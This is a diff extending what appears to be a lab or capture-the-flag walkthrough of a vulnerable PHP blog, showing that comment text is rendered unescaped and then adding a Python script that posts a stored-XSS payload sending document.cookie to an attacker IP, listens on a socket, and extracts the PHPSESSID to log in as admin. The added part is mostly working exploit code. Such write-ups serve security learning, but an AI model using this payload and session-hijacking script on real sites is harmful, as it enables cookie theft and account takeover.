@@ -140,7 +140,7 @@ We shall see which file is handling those comments and to see that i will interc
 <br/>
 <<selection 008>>
 <br/>
-File which is handling the comments is   ```post_comment.php```   So let's analyse it...
+File which is handling the comments is ```post_comment.php``` So let's analyse it...
 
 ### post_comment.php
 
@@ -286,3 +286,90 @@ Awesome we can insert anything inside it but we shall how this data will be prin
 Notice this part ```code:-echo $post->render_with_comments(); ``` 
 
 There's another function in ```classes/post.php``` named ```render_with_comments()``` let's analyse it
+
+**render_with_comments()**
+
+```php
+function render_with_comments() {
+    $str = "<h2 class=\"title\"><a href=\"/post.php?id=".h($this->id)."\">".h($this->title)."</a></h2>";
+    $str.= '<div class="inner" style="padding-left: 40px;">';
+    $str.= "<p>".htmlentities($this->text)."</p></div>";   
+    $str.= "\n\n<div class='comments'><h3>Comments: </h3>\n<ul>";
+    foreach ($this->get_comments() as $comment) {
+      $str.= "\n\t<li>".$comment->text."</li>";
+    }
+    $str.= "\n</ul></div>";
+    return $str;
+  }
+```
+
+Here we can Notice:-
+```php
+foreach ($this->get_comments() as $comment) {
+      $str.= "\n\t<li>".$comment->text."</li>";
+    }
+```
+That the value of ```text``` field is being printed without any filtering so this gives us a green flag for ***Stored xss***
+So, Let's Try to insert a basic xss popup payload...
+
+<br/>
+<<selection 010>>
+<br/>
+
+So we can do stored xss let's automate this with python and grab cookies :)
+
+**trigger function**
+
+```python
+r=requests.Session()
+
+target_url="http://192.168.0.5/"
+
+attacker_ip="192.168.0.9"  # FOR xss
+
+os.system("clear")
+
+def trigger():
+    print("[+] Creating xss vector")
+    port=randint(5000,9000)
+    vector="<script>document.location='http://{}:{}/' +escape(document.cookie)</script>".format(attacker_ip,port)
+    print("[+] Sending xss vector")
+    sender(vector,port)
+```
+
+We created some variables and used ```randint``` function from ```random``` class to generate random 4 digit port address and then the payload is being created it's basic payload to open the url with javascript with ```document.cookie``` 
+and sent the payload and port to ```sender``` function
+
+**sender function**
+
+```python
+def sender(xss,port):
+    url=target_url+"post_comment.php?id=1"
+    data={'title':'lolzz','author':'aaa','text': xss,'submit':'Submit'}
+    proxy={'http':'127.0.0.1:8080'}
+    out=r.post(url,data=data)
+    if out.status_code==200:
+        print("[+] xss payload sent Successful")
+        cookie=servers(port)
+        login_admin(cookie)
+```
+
+In this function we created the ```data``` field which had the variables for **POST** request with the xss payload in text field and sent it by ```requests``` module's post method so by this we can easily make a comment on the website and the ```servers``` function will create a local listner using sockets on the port created by randint
+
+**servers function**
+```python
+def servers(port):
+    HOST = ''
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind((HOST, port))
+        s.listen(1)
+        conn, addr = s.accept()
+        with conn:
+            m=conn.recv(2048)
+            print("[+] xss triggered capturing cookies to login")
+            out=re.findall("PHPSESSID\%3D.*HTTP",m.decode('utf-8'))
+            out=out[0].replace("PHPSESSID%3D","").replace("HTTP","")
+            return (out.replace("\n","").replace("\t",""))
+```
+
+In this function i have done some horrible regex to filter out the cookie and return it back to the ```cookie``` variable used in the ```trigger function``` and later on it will be used to login in the admin panel by using the ```login_admin()``` function.
